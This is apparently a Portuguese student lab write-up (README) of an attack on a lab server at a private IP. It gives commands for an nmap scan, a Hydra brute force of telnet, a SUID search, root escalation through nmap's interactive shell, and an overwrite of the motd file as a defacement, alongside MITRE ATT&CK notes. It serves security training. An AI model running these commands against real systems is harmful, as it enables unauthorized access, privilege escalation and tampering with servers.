![banner GS cyber](https://user-images.githubusercontent.com/48387196/121257879-9a9ab300-c884-11eb-9a9a-4923081f3d28.png)

Essa exploração de vulnerabilidades tem por objetivo buscar entrar em um servidor para demonstrar as possíveis falhas através do uso de brute force e escalação de privilégios.

## Scan das portas

```
nmap -sS 10.0.2.4 | tee nmap-ss.txt
```

Por que fazer um port scanning? a ideia de se fazer um tipo de scan desses e buscar portas abertas e suscetíveis a ataques. Usando o `tee` conseguimos salvar estas portas em um arquivo txt.

## Análise de vulnerabilidades

Depois da análise das portas vamos fazer uma análise de vulnerabilidades utilizando o Sparta que é uma ferramenta de scanner de vulnerabilidades. Com o Sparta já instalado vamos rodar alguns comandos para iniciarmos ele.

Start in /usr/share/sparta

```
python3 sparta.py 
```

Após o início do programa colocamos nosso host 10.0.2.4 que será atacado e podemos buscar por vulnerabilidades dentro desse servidor.

![image](https://user-images.githubusercontent.com/48387196/120836104-934d6f80-c53b-11eb-824f-124133d6274f.png)

Com o sparta o nmap roda até o layer 3 e roda também o nikto para busca de vulnerabilidades web. Ainda podemos rodar o disbuster por exemplo para buscar pastas escondidas no servidor web e também fazer um brute force direto no programa.

## Mitre Att&ck

Brute Force ID: T1110

Os adversários podem usar técnicas de força bruta para obter acesso a contas quando as senhas são desconhecidas ou quando os hashes de senha são obtidos. Sem o conhecimento da senha de uma conta ou conjunto de contas, um adversário pode adivinhar a senha usando um mecanismo repetitivo ou iterativo. A força bruta de senhas pode ocorrer por meio da interação com um serviço que verificará a validade dessas credenciais ou off-line em relação aos dados de credenciais adquiridos anteriormente, como hashes de senha.

Exploitation for Privilege Escalation ID:T1068

Os adversários podem explorar vulnerabilidades de software na tentativa de elevar privilégios. A exploração de uma vulnerabilidade de software ocorre quando um adversário se aproveita de um erro de programação em um programa, serviço ou no próprio software do sistema operacional ou kernel para executar código controlado pelo adversário. Construções de segurança, como níveis de permissão, muitas vezes dificultam o acesso a informações e o uso de certas técnicas, pois os adversários provavelmente precisarão realizar escalonamento de privilégios para incluir o uso de exploração de software para contornar essas restrições.

Ao obter inicialmente acesso a um sistema, um adversário pode estar operando dentro de um processo com privilégios inferiores, o que o impedirá de acessar certos recursos do sistema. Podem existir vulnerabilidades, geralmente em componentes do sistema operacional e software geralmente executados com permissões mais altas, que podem ser exploradas para obter níveis mais altos de acesso no sistema. Isso pode permitir que alguém mude de permissões de nível de usuário ou sem privilégios para permissões de SISTEMA ou root, dependendo do componente vulnerável. Isso também pode permitir que um adversário mude de um ambiente virtualizado, como em uma máquina virtual ou contêiner, para o host subjacente. Essa pode ser uma etapa necessária para um comprometimento do adversário com um sistema de terminal que foi configurado corretamente e limita outros métodos de escalonamento de privilégios.

Os adversários podem trazer um driver vulnerável assinado para uma máquina comprometida para que possam explorar a vulnerabilidade para executar o código no modo kernel. Esse processo às vezes é conhecido como Traga seu próprio driver vulnerável (BYOVD). [1] [2] Os adversários podem incluir o driver vulnerável com arquivos entregues durante o acesso inicial ou baixá-lo para um sistema comprometido via Ingress Tool Transfer ou Lateral Tool Transfer.

## TelNet

O TELNET é um serviço muito vulnerável. Por não possuir nenhum tipo de criptografia, permite a descoberta de senhas e captura de informações.Através de uma sessão TELNET é possível disparar ataques, descobrir portas desprotegidas e serviços que estão sendo executados no servidor. O TELNET também é usado freqüentemente para gerar correio e notícias falsas (fakemail e fakenews).

## Brute Force Attack

Sabemos que existem portas abertas dentro do servidor e com isso podemos fazer um ataque de força bruta e tentar acessar o servidor. Fiz uma fork de um repositório com wordlists e vamos tentar buscar acesso com uma senha já conhecida por diversas pessoas.

Vamos utilizar a ferramenta Hydra para fazer esse brute force dentro do servidor e buscar entrar dentro do servidor apenas usando uma wordlist e batendo user e senha.

Vamos entrar na pasta do kali /user/share/wordlists e fazer um gunzip do rockyou.(mas como vamos utilizar um exemplo eu baixei uma wordlist da internet mais simples para não demorar tanto esse brute force).

```
hydra -l funcionario -P passlist.txt 10.0.2.4 telnet -V 
```

Através do hidra e de senhas já conhecidas em uma wordlist conseguimos obter o acesso ao servidor 

## Escalando privilegios

![hack](https://hackerculture.com.br/wp-content/uploads/2021/04/priv-escalation.png)

Depois de buscar o acesso ao servidor percebemos que o user não tem privilégios para a gente conseguir acessar todas as vulnerabilidades, por isso vamos precisar de uma escala de privilégios

Entrando no servidor:

```
ssh funcionario@10.0.2.4
```

Vamos buscar por todos os programas que possuem privilégios:

```
find / -user root -perm -4000 2>/dev/null
```

Logo após sabemos que o nmap possui privilégio vamos utilizar ele para ter acesso root ao servidor, utilizando o código abaixo para ter acesso ao modo interativo do nmap.

```
nmap --interactive 
```
Rodar o shell

```
!sh
```

Agora se eu der um `id` ou `whoami` eu apareco como root

Entao agora bora na pasta principal do servidor e colocar nossa ASCII no motd

```
rm -rf motd
```
```
cat > motd
e cola o ASCII
CTRL + Z
```

## Tools using

- nmap
- hydra
- wordlists
- sparta
- GTFOBins

No documento da GS explico mais sobre como combater tais falhas encontradas e analisadas neste README

## ASCII

```
                        |\
               \`-. _.._| \
                |_,'  __`. \
                (.\ _/.| _  |
               ,'      __ \ |
             ,'     __/||\  |
            (     ,/|||||/  |
               `-'_----    /
                  /`-._.-'/
                  `-.__.-' 

  _____      _              _ _           
 |  __ \    | |            | | |          
 | |__) |_ _| |_ _ __ _   _| | |__   __ _ 
 |  ___/ _` | __| '__| | | | | '_ \ / _` |
 | |  | (_| | |_| |  | |_| | | | | | (_| |
 |_|   \__,_|\__|_|   \__,_|_|_| |_|\__,_|
                                          
                                          
```
